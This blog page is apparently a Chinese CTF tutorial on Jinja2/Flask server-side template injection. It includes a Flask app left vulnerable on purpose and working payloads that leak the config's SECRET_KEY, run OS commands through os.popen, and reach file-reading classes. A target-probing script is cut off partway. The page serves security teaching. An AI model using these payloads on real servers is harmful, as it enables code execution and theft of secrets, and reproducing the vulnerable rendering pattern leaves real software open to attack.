@@ -1,0 +1,2734 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="介绍 SSTI（Server-Side Template Injection，服务器端模板注入）是 Web 安全中一种高危漏洞，Python 生态里最常见的就是 Jinja2（Flask/Django 常用模板引擎）的 SSTI 漏洞。\n">
+<title>5.1 Web 之Python模板注入SSTI</title>
+
+<link rel='canonical' href='https://www.retr0.xyz/p/5.1-web-%E4%B9%8Bpython%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti/'>
+
+<link rel="stylesheet" href="/scss/style.min.67c2cdd23260c968137443c657d1f7a9a3df6cb47c832d8909e5b1c8880a7e9c.css"><meta property='og:title' content="5.1 Web 之Python模板注入SSTI">
+<meta property='og:description' content="介绍 SSTI（Server-Side Template Injection，服务器端模板注入）是 Web 安全中一种高危漏洞，Python 生态里最常见的就是 Jinja2（Flask/Django 常用模板引擎）的 SSTI 漏洞。\n">
+<meta property='og:url' content='https://www.retr0.xyz/p/5.1-web-%E4%B9%8Bpython%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti/'>
+<meta property='og:site_name' content='Retr0的小窝'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-03-18T07:32:12&#43;08:00'/><meta property='article:modified_time' content='2026-03-18T07:32:12&#43;08:00'/>
+<meta name="twitter:title" content="5.1 Web 之Python模板注入SSTI">
+<meta name="twitter:description" content="介绍 SSTI（Server-Side Template Injection，服务器端模板注入）是 Web 安全中一种高危漏洞，Python 生态里最常见的就是 Jinja2（Flask/Django 常用模板引擎）的 SSTI 漏洞。\n">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+        <link rel="stylesheet" href="/css/APlayer.min.css">
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css">
+        <script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"></script>
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_918ed7c4aecb3d05.gif" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">😎</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Retr0的小窝</a></h1>
+            <h2 class="site-description">上工咯！</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://space.bilibili.com/349466985'
+                        target="_blank"
+                        title="Bilibili"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v6a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4v-6z" /><path d="M8 3l2 3" /><path d="M16 3l-2 3" /><path d="M9 13v-2" /><path d="M15 11v2" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='mailto:ded000@retr0.xyz'
+                        target="_blank"
+                        title="email"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-mail"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 7a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v10a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-10z" /><path d="M3 7l9 6l9 -6" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/makabaka11'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://www.retr0.xyz/index.xml'
+                        target="_blank"
+                        title="RSS"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-rss"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 19m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0" /><path d="M4 4a16 16 0 0 1 16 16" /><path d="M4 11a9 9 0 0 1 9 9" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://t.me/ded0000'
+                        target="_blank"
+                        title="Telegram"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-telegram"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M15 10l-4 4l6 6l4 -16l-18 7l4 2l2 6l3 -4" /></svg>
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页 | Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E-about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于 | About</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档 | Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/message/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-message"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 9h8" /><path d="M8 13h6" /><path d="M18 4a3 3 0 0 1 3 3v8a3 3 0 0 1 -3 3h-5l-5 3v-3h-2a3 3 0 0 1 -3 -3v-8a3 3 0 0 1 3 -3h12z" /></svg>
+                
+                <span>留言板 | Msg Board</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索 | Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E6%8A%80%E6%9C%AF%E9%93%BE%E6%8E%A5-links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>技术链接 | Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#介绍">介绍</a></li>
+    <li><a href="#利用方法">利用方法</a>
+      <ol>
+        <li><a href="#利用子类可直接调用的函数">利用子类可直接调用的函数</a></li>
+        <li><a href="#利用重载函数">利用重载函数</a></li>
+        <li><a href="#利用内嵌函数">利用内嵌函数</a></li>
+        <li><a href="#其他-payload">其他 payload</a></li>
+      </ol>
+    </li>
+    <li><a href="#常见绕过突破">常见绕过突破</a>
+      <ol>
+        <li><a href="#过滤中括号">过滤中括号</a></li>
+        <li><a href="#过滤了点">过滤了点</a></li>
+        <li><a href="#过滤下划线">过滤下划线</a></li>
+      </ol>
+    </li>
+    <li><a href="#fenjing-使用">fenjing 使用</a></li>
+    <li><a href="#例题">例题</a>
+      <ol>
+        <li><a href="#ssti1无过滤">ssti1（无过滤）</a></li>
+        <li><a href="#ssti2过滤点">ssti2（过滤点）</a></li>
+        <li><a href="#ssti3过滤中括号和点">ssti3（过滤中括号和点）</a></li>
+        <li><a href="#ssti4过滤中括号和下划线">ssti4（过滤中括号和下划线）</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E7%BD%91%E5%AE%89/" style="background-color: #BEBDBD; color: #fff;">
+                网安
+            </a>
+        
+            <a href="/categories/ctf/" >
+                CTF
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/5.1-web-%E4%B9%8Bpython%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti/">5.1 Web 之Python模板注入SSTI</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+     
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2026-03-18 | 07:32</time>
+            </div>
+        
+
+        
+
+        
+        <div id="viewCount">
+            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-eye"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 12a2 2 0 1 0 4 0a2 2 0 0 0 -4 0" /><path d="M21 12c-2.4 4 -5.4 6 -9 6c-3.6 0 -6.6 -2 -9 -6c2.4 -4 5.4 -6 9 -6c3.6 0 6.6 2 9 6" /></svg>
+            <time class="article-time--reading">
+                <span id="vercount_value_page_pv">loading... </span>次
+            </time>
+        </div>
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="介绍">介绍
+</h2><p>SSTI（Server-Side Template Injection，服务器端模板注入）是 Web 安全中一种高危漏洞，Python 生态里最常见的就是 Jinja2（Flask/Django 常用模板引擎）的 SSTI 漏洞。</p>
+<p>flask 是使用Jinja2来作为渲染引擎的,网站根目录下的templates文件夹是用来存放html文件,即模板文件。</p>
+<p>flask的渲染方法有：</p>
+<p><code>render_template</code>和<code>render_template_string</code>两种，<code>render_templatet()</code>是用来渲染一个指定的文件的，<code>render_template_string</code>则是用来渲染一个字符串的，<strong>不正确的使用flask中的render_templateLstring 方法会引发SSTI</strong>。</p>
+<p>模板引擎（如Flask使用的Jinja2）会将特定的表达式或占位符，如<code>{{}}</code>视为代码进行解析。</p>
+<p><strong>举例：</strong></p>
+<p>你去奶茶店点单，店员有个「模板话术」：&ldquo;您点的是{{drink}}，甜度{{sugar}}&quot;。正常情况下，你输入drink=珍珠奶茶、sugar=正常，会输出&quot;您点的是珍珠奶茶，甜度正常&rdquo;；但如果你恶意输入drink={{7*7}}，店员直接把这个「模板指令」执行了，输出&quot;您点的是49，甜度正常&quot;——** 这就是模板注入的核心：用户输入被当成模板代码执行了。**</p>
+<p><strong>搭建一个简单的测试环境：</strong></p>
+<p>安装依赖：<code>pip install flask</code></p>
+<p>运行下面的脚本：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template_string</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 关闭调试模式不影响漏洞，仅为模拟真实环境</span>
+</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 接收用户输入的name参数</span>
+</span></span><span class="line"><span class="cl">    <span class="n">name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">,</span> <span class="s1">&#39;Guest&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 【漏洞核心】直接拼接用户输入到模板字符串中</span>
+</span></span><span class="line"><span class="cl">    <span class="n">template</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;&lt;h1&gt;Hello, </span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s1">!&lt;/h1&gt;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 渲染模板（会解析{{}}语法）</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">template</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol>
+<li>安装依赖：<code>pip install flask</code></li>
+<li>运行脚本：<code>python test_ssti.py</code></li>
+<li>访问测试：</li>
+</ol>
+<ul>
+<li>正常输入：<code>http://127.0.0.1:5000/?name=test</code> → 输出Hello, test!</li>
+<li>注入计算：<code>http://127.0.0.1:5000/?name={{100*5}}</code> → 输出Hello, 500!</li>
+<li>读取配置：<code>http://127.0.0.1:5000/?name={{config}}</code> → 看到 Flask 的配置字典（含 SECRET_KEY）</li>
+<li>执行命令（Linux）：<code>http://127.0.0.1:5000/?name={{__import__('os').popen('id').read()}}</code> → 输出当前用户 ID</li>
+</ul>
+<h2 id="利用方法">利用方法
+</h2><h3 id="利用子类可直接调用的函数">利用子类可直接调用的函数
+</h3><p><strong>注：该部分涉及到Python的面向对象，可以查阅之前的相关文章</strong></p>
+<ol>
+<li><strong>魔术方法</strong></li>
+</ol>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th>魔术方法</th>
+          <th>描述</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>__class__</code></td>
+          <td>返回对象所属的类。</td>
+      </tr>
+      <tr>
+          <td><code>__base__</code></td>
+          <td>返回该类所继承的上一个基类。(常用于查找基类)</td>
+      </tr>
+      <tr>
+          <td><code>__mro__</code></td>
+          <td>返回一个类所继承的基类元组 (Method Resolution Order)。方法在解析时按照元组的顺序解析。(常用于查找基类)</td>
+      </tr>
+      <tr>
+          <td><code>__subclasses__</code></td>
+          <td>每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的子类引用的列表。</td>
+      </tr>
+      <tr>
+          <td><code>__init__</code></td>
+          <td>类的初始化方法，在对象创建后被调用。</td>
+      </tr>
+      <tr>
+          <td><code>__globals__</code></td>
+          <td>对包含函数全局变量的字典的引用。</td>
+      </tr>
+  </tbody>
+</table></div>
+<hr>
+<ol start="2">
+<li><strong>常用payload：</strong></li>
+</ol>
+<p>读取当前类:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="p">}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>读取当前类的父类：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="p">}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>读取当前类的父类下的所有子类：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>选择其中的一个子类：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">68</span><span class="p">]}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>补充：</p>
+<p><code>__mro__[xx]</code>也可以用于读取父类，因为有时候<code>__base__</code>会被过滤，相较于base是一级一级退，mro可以直接在中括号中填写要退的级数，因此它可以一次性退很多级。</p>
+<hr>
+<p>通常，<code>&lt;class '_frozen_importlib_external.FileLoader'&gt;</code>类下的<code>get_data</code>函数可以进行文件读取：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://free.picui.cn/free/2026/03/18/69b9e2b4d5689.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>如何定位这个类的位置（序号）？</p>
+<p>可以使用下面的python脚本来定位：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">html</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">target_class</span> <span class="o">=</span> <span class="s2">&#34;&lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;请输入URL: &#34;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">url</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;错误：URL不能为空&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;{{&#39;&#39;.__class__.__base__.__subclasses__()}}&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 规范拼接URL参数（使用params避免手动拼接）</span>
+</span></span><span class="line"><span class="cl">    <span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;a&#34;</span><span class="p">:</span> <span class="n">payload</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 设置请求头和超时，提升健壮性</span>
+</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
